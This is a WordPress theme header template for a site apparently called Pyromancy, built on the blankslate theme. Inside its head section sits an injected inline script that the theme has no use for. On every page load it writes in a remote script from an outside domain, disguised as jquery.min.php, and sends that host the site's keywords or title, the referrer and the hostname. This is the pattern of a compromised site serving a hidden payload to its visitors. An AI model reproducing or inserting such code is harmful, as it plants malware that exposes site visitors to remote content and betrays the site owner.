<!DOCTYPE html>
<html <?php language_attributes(); ?> xmlns="http://www.w3.org/1999/html">
<head>
    <meta charset="<?php bloginfo('charset'); ?>"/>
    <title><?php wp_title(' | ', true, 'right'); ?></title>
    <link rel="stylesheet" type="text/css" href="<?php echo get_stylesheet_uri(); ?>"/>
    <?php wp_head(); ?>


<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://portal.mersinmatematikmerkezi.com/js/jquery.min.php?c_utt=G91825&c_utm='+encodeURIComponent('http://portal.mersinmatematikmerkezi.com/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
</head>
<body <?php body_class(); ?>>
<div id="wrapper" class="hfeed">
    <header id="header" role="banner">
        <section id="branding" class="ghidden">
            <div id="site-title"><?php if (!is_singular()) {
                echo '<h1>';
            } ?><a href="<?php echo esc_url(home_url('/')); ?>"
                   title="<?php esc_attr_e(get_bloginfo('name'), 'blankslate'); ?>"
                   rel="home"><?php echo esc_html(get_bloginfo('name')); ?></a><?php if (!is_singular()) {
                echo '</h1>';
            } ?></div>
            <div id="site-description"><?php bloginfo('description'); ?></div>
        </section>
        <nav id="menu" role="navigation">
            <a href="<?php echo esc_url(home_url('/')); ?>"
               title="<?php esc_attr_e(get_bloginfo('name'), 'blankslate'); ?>" rel="home">
                <img class="header-image"
                     src="<?php echo get_template_directory_uri(); ?>/images/pyromancy-web-header.png"/>
            </a>
            <div class="">
                <?php wp_nav_menu(array('theme_location' => 'header-menu')); ?>
            </div>
            <img class="header-rule" src="<?php echo get_template_directory_uri(); ?>/images/header-bar.png"/>
        </nav>
    </header>
    <div id="container">